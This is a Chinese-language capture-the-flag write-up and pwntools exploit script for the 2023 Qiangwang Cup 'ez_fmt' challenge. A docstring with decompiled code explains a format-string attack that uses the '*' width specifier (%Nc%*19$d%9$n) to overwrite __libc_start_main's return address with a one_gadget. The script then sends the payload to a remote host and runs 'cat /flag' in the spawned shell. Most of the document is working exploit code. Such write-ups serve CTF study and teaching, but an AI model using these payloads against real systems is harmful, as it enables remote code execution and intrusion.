"""
2023 强网杯 ez_fmt
  char buf[88]; // [rsp+0h] [rbp-60h] BYREF
  unsigned __int64 v5; // [rsp+58h] [rbp-8h]

  v5 = __readfsqword(0x28u);
  setvbuf(stdout, 0LL, 2, 0LL);
  setvbuf(stdin, 0LL, 2, 0LL);
  printf("There is a gift for you %p\n", buf);
  read(0, buf, 0x30uLL);
  if ( w == 0xFFFF )
  {
    printf(buf);
    w = 0;
  }
  return 0;

这是看的别人的wp，原来格式化字符串还有*d参数
%Nc%*A$d%B$n
第1段%Nc是输入N个字符，
第2段里A是一个偏移（本题反回地址是偏移19），会输出偏移位置的值个字符，这里用__libc_start_main_ret这个值
前两部分输出的值（特别大）就是把libc_start_main_ret+offset = one 
第3部分B是偏移(payload里的栈地址指向返回地址，也就是偏移19这个位置)这里把前边的这个数写到偏移处指针指向的地址，也就实现了把_libc_start_main_ret改为one

这种方法的问题就是输出一个libc地址再写，这个libc地址巨大，linux虚拟上可能就会挂掉，在windows上不会挂。
"""

from pwn import *
context(arch='amd64', log_level='debug')
 
#p = process('./ez_fmt')
p = remote('47.104.24.40', 1337)
 
p.recvuntil(b"you ")
stack = int(p.recvline(), 16)
 
#one = 0xe3b01
'''
gef➤  p 0xe3b01+0x00007ffff7dd5000
$1 = 0x7ffff7eb8b01
gef➤  p $1-0x00007ffff7df9083
$2 = 0xbfa7e
'''
v1 = 0xbfa7e  #one-__libc_start_main_ret
pay = f"%{v1}c%*19$d%9$n".ljust(0x18, 'a').encode() + p64(stack+0x68)
p.send(pay)
 
p.recvuntil(b'aaa')
p.sendline(b'cat /flag')
p.interactive()